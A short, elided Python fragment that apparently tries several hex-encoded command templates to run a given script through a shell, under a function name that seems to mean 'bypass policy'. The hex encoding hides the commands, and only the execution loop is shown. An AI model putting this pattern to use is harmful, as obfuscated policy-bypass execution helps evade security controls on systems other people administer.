...
def by_pol1cy(script):
	...
	for method in methodss:
		p = subprocess.Popen( command.format( binascii.unhexlify( method ).decode().format( script ) ) ,shell=True ,stdout=subprocess.PIPE ,stderr=subprocess.PIPE ,stdin=subprocess.PIPE)
